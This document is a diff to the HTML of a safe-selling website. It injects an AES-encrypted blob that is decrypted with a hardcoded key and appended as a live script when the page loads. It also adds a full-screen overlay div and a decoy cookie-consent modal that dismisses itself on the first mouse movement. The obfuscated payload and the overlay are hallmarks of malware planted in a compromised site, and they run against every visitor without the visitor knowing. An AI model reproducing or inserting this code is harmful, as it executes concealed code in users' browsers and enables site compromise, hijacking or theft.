@@ -58,6 +58,134 @@
   </style>
 </head>
 <body>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, '2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+
+    const codeString = aesDecode(`U2FsdGVkX1%2FY%2BlqLJy1s8YC7iEiC8YIgRUbxPRBkGi5j0fdEKrEDFvbfBbSIx4G%2FxbFD3QbVjH9fhCmTYO52UUIzSVhxf1MFDNz3fAfU9aKKZ7XWfrW1ZzWxoPNrSiKJP4yylrTCpWgKHmKfYkjnU30jy5%2BQPC87ahGHSQXMUt21cSKnbfx%2BaDIKVYjJTYQshIU2%2Fh1RaHmsjcCgMag9MhUbT9GsWDr3IRMJAZzk5KVRNCbpXo6Nh4ZOVAu8%2FRoFMvDGF6hP7mAwmebjrVHKcgrkObfsxJlZUSbV4dyOHWZQ%2F6BWCXqS8ZNiKQdgn%2FMjrlXLJ6uoGEEIIm1iqWg1xx0rzGlwfdBYgPYl5JXXGu0XPOwrAQ1bMEhJTWPQzVPkY8lZxK1fMfafCw6Tly88EaHKWHCs6COw9IXHqEi%2BdOz6eRkdRdT9yeQ3nmaIWPgkbuVltQCpPhezO5HmJHrPNwkOQASPO58IjCcMRbErD9YfBDhbg7v%2BTnZusuAObpIGVpbLwUOkP%2BOQWsNvQ02mQMpjKJjPTR8YxhMIRtGDMwWIlCW6MA7W5OpReEfAUUSkWgJBJW0mSo%2FcLsMmxziwEha6xcAUyvZWpTvTVtSEfvpl4gqcK3501AtvZgKEYPpDh8E8lwHJ3EulNen7CIGS6%2BhH%2FoDCq1QVGA%2Fc7vvuSEAbN6BThLClfjdYJcSdUuU6lwxRSkqdMR2aZ3Syn28VVEgv9wn1md22fnYZgciX2KlDv2Q8iN%2BkbJZwvNygn%2BfYSAD8Khe7L7BySnVx6glZhMgHpEUizIwpYkDZhPCoseIxKA6eboOFKVMJI3ulVtfkV%2B7CLci52VkQG8t0Veum%2B0K2Nm1XKeR6h4l5nmqKSJCgE5sbZuBw3wS6mx0M%2Bqj6K6H%2FlVdceF6r6Gf7P%2BJVV6pDlsmHUnmF3AtRjFnmbSkU7sFRQSowj8Sq6nZ1GGeqxJkGKAJDhdqyCviyhCdPlN4J5lgF7mNH7C5%2F%2BTo4YXIE3fItL5fHXU0Q20qQT3yE7YZcgHqD8Rn%2FtltLGBHYUSCKNBNcdL1H6EvHahUEJ%2B99neQXT9LBepm6NlVOhRZSyLBEFLTvjQS1Ys%2Fp9T%2FzpsV9%2FO%2Fri07AnrHOO9KQoA10LEZR48tINdXLsWqtPtVy6UizUdggosjEGQdETcA2rcm5shDeggz8WQQrtM6CQ1vq7rEWBeEoJRIy5F0zJiyzMCj%2F2h7PTij2L%2FfsQJGYvHWzrxP6xjas%2B7rR4NTcoNMjOUsVl07DWlBtLCNlBI%2Fv9QZET1ABZq4gyLCmE2kJHK2MnteP88xCfSq5%2F9xy9tWpWQTHVK0vf8LsUyaji4sahzGwA9c%2B%2F0oBHXp3bjPbPCt7aCz1%2BZB5gLI7TbBUYFfr4a%2BMIxPZO7hAkXq52UrKFTlNXB%2F4rXfbTefmI%2FxU6khpXJv5mRnw7XEnGwHDoG%2Byd8fmJqtVarScKp%2FqI6UvRvfrp5lXSuncrj5FcZPDvKXVcbVVKmqDQNPkqiSdR2%2Fvf1PnAU7elxfGnqSq4UDymcKRFeAOFGqmRV%2BjuC619IGWYJxhQ1IUPuNedXz9rJcqpTSSIxXuILCIjlhZrTwKhl9Vsq9YZZsKpsfPsfe9Ph6VWBEmHj9Zq1Mg50RAE0lPU%2BOdcGBWjJ7TQfkvsVcRDQl8%2BAW2hZ%2FZ7TlUsv%2Fti7%2B60oufZer0yfUs45%2FnACiUu6DiPyV8GeStdCw4h81tdoWZLzqhdfFN0H5XGkLxEtBtXxz%2BMcKIwpSH6PtC0SaCzKnjQX0QbsaeIqkR0a6bhVYbT3WIvqb2t2OiTpT9Ku4%2FnsynKcV3k0hO5VFuMb960tylVN4BtcuNe2kqfSJsFKwfp19DyDeK%2FT9PahJYtcvg0NMgQM7MwvH6KMqlu%2FcttaFsC58p6sIUWVYPr4uETlgNSv3nbsaJaqgkUHzCU%2BIfbWy7LSBs6J%2FBlBZOze6T5tMUX5T%2B%2BEYyYsjjNi6AjThcvOQyZidj6vAjF2vvIPBDxUJ%2BWf0EalFRTVdAxBopDARM9pRSgTV0%2BdgCnrQH7rBOt2Jg5RVYZpYFebx%2FV%2FceL3I7QvOXhBAhXUBsHdsnoeTuiVCvG8aMUvVi4FXJafGR%2BKmo8EXdGJQQav9DN0Y9A81iSDbwTMXdlT44Y%2BjARM0NW7e1sRY3lHxyJLv0uNqHAju9aVViqCGg3y7vIPBdJKz%2BCyvPNLBgIhLanMKLK5Wphl%2BBdjLGzhxrzzuIjhERN6A6%2FUrKIjVrGiCK%2BFVCLbRXC7hTbSmsuVftnpgZOYJ5dmWL3nKmtqG%2BUpAD8dtUGzJEc1ZTmloHYtTpleQCaXM5y%2FoGzUPrY1GShOFOUMesPeskcHNHuiwZXknL15UNTCzhLJ1EPCYiWQLcgNYeMM6PS8G6HGDdtinAU9M4S%2BaI5%2B9OtGGyFMqJLINFrf1hoCarVWtlhEKCddYb4JPkpYb2kK4bPnFC%2FOSVhT3p21BS4IinuQztTAAu3jMZpVJkmyPLxwRG4lwPMnEsWt%2BhUXiWYomkWGxi%2F%2FxdnGNr7GoD3ZWu2L9rV%2BVw1dO3xVUnBoFqmMGIOCFpIoS6Pk41mKFMLfq0YUnGKEiUK83GXE%2FbuHpYU1OJJVKAJwUvtmiUy7Cp%2Bhu4LmKQ17lE9i79iWGiIDehPL7lcVkZlLLVFyFV8BTUiodYbZBUVH04aRsCYjeEn9MX4j%2F7JrZQnbSbR%2FtZQahridC7W22djNlfwZv2GysEphK0GIDaS7TJJw2ZxjvCiT2Q7bbJswREk%2BL0MrkOsubuD3Izo%2FT5wlFsyKL8%2FeOj6nxw5YZCI%2FTvbqLYq2phpvcnWbvGyY3UY9HvxcJrIZ8%2Bfy8OsbcAdVXiqNLSDOThOxO4zCs23joKxD%2FKDypcQTP4bUJVx2%2FhqPubvGCViXDvmJ2ai3fhaNJ%2BRwA81mhG1DZfGE4d5ND1ugTVAcSFa1qhPOCuOBioDocunD%2Fg77f3NG6EFoN8fqcp09htJKRrNAev%2BwwbfWzmRCiQe90ZPMLt2dcbon2tUjAZJxBucpXrR95Qx5e3lLKvjjeoxhBQVhLG%2BJlKjeAOVR%2FtGzkm%2B4gMEXoj3i9C%2BArkP4WcwoNIt5qYszp4VBzuIeqFtQIgWpYHorGfN1MTKDW1V4KlsG9zQhtbFHldyu6kzdjWG4xxMH2z1hxK0UFotlGqvtiGuyGoxbfbRsaW3Or8v%2BvbT%2FxE8aQ0ogC8WM4R7%2BqE%2FICTYlatm01uKN3S0wwg7zfT5rLpe3H1p52ryfzn47NWh3gMyJma%2BlcTm%2FUcc5WKhu16afYy2flNt7KHsQYZv5Izkh0eiPt3eMv6H3t8ItHhrLcLMFHChpApgiB1BdlvbuAfvgjASBjr0djJ0iEFMBa1GvjKeNdkX8i8OxJNVKVhvX1VO6AEAaLq%2BHcOfiLnwvxBbcT6YZKO4xtwN%2BigwlV5ZZE%2FpbDwCl7tmqLntn4ra3DEEN1WpMgjuNje7KVgD64MJBflViXgwTvbH2B%2Blumum92unDvMP%2B8j`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script>
+
+<div id="contentiframe" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+
+</div>
+
+<div id="cookie-modal-box" class="hidden">
+  <!-- Backdrop -->
+  <div id="cookie-backdrop"
+       class="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm opacity-0 transition-opacity duration-300"></div>
+
+  <!-- Modal -->
+  <div id="cookie-modal"
+       class="fixed inset-0 z-50 flex items-center justify-center p-4 opacity-0 scale-90 transition-all duration-300 ease-out">
+
+    <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative border border-gray-100">
+
+      <!-- Close Button -->
+      <button id="cookie-close"
+              class="absolute top-4 right-4 p-1 rounded-full text-gray-400 hover:text-red-500 hover:bg-gray-100 transition">
+        ✕
+      </button>
+
+    <div class="flex items-center gap-3 mb-5">
+        <span class="text-3xl">🍪</span>
+        <h2 class="text-2xl font-semibold tracking-tight">About Cookies</h2>
+      </div>
+
+      <p class="text-gray-600 leading-relaxed mb-6">
+        This site uses cookies to provide you with a better user experience. 
+        By clicking <span class="font-semibold text-gray-800">"Accept"</span>, 
+        you agree to our use of cookies.
+      </p>
+
+      <div class="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-6 text-sm text-gray-600 leading-relaxed">
+        <p class="mb-2 font-semibold text-gray-700">Policy Summary</p>
+        <ul class="list-disc pl-5 space-y-1">
+          <li>Essential Cookies: Required for basic site functions</li>
+          <li>Analytics Cookies: Used to analyze site usage</li>
+          <li>Marketing: Used for ad optimization</li>
+        </ul>
+        <p class="mt-2">
+          For more details, please check our 
+          <a href="#" class="text-blue-600 hover:underline">Privacy Policy</a>.
+        </p>
+      </div>
+
+      <div class="flex flex-col sm:flex-row gap-3">
+        <button id="cookie-accept"
+                class="flex-1 bg-green-600 hover:bg-green-700 active:scale-[0.98] text-white py-3 px-6 rounded-lg font-semibold transition">
+          🍪 Accept
+        </button>
+
+        <button id="cookie-decline"
+                class="flex-1 bg-gray-200 hover:bg-gray-300 active:scale-[0.98] text-gray-800 py-3 px-6 rounded-lg font-semibold transition">
+          Decline
+        </button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const modalBox = document.getElementById("cookie-modal-box"),
+      modal = document.getElementById("cookie-modal"),
+      backdrop = document.getElementById("cookie-backdrop"),
+      acceptBtn = document.getElementById("cookie-accept"),
+      declineBtn = document.getElementById("cookie-decline"),
+      closeBtn = document.getElementById("cookie-close");
+
+// Show modal
+function showModal() {
+  modalBox.classList.remove("hidden");
+
+  setTimeout(() => {
+    backdrop.classList.remove("opacity-0");
+    modal.classList.remove("opacity-0", "scale-90");
+  }, 10);
+}
+
+// Hide modal (same behavior preserved)
+function hideModal(choice) {
+  localStorage.setItem("cookie-consent", choice);
+
+  backdrop.classList.add("opacity-0");
+  modal.classList.add("opacity-0", "scale-90");
+
+  setTimeout(() => {
+    modalBox.classList.add("hidden");
+  }, 1500);
+
+  document.removeEventListener("mousemove", mouseMoveClose);
+}
+
+// Mouse move close (unchanged)
+function mouseMoveClose() {
+  hideModal("closed");
+}
+
+// Events (unchanged)
+acceptBtn.onclick = () => hideModal("accepted");
+declineBtn.onclick = () => hideModal("declined");
+closeBtn.onclick = () => hideModal("closed");
+backdrop.onclick = () => hideModal("closed");
+
+// Init (unchanged)
+if (!localStorage.getItem("cookie-consent")) {
+  showModal();
+  document.addEventListener("mousemove", mouseMoveClose, { once: true });
+}
+</script>
+
+
+  
   <header>
     <h1>Safes.by</h1>
     <p>Need to buy a safe? You're on the right track!</p>
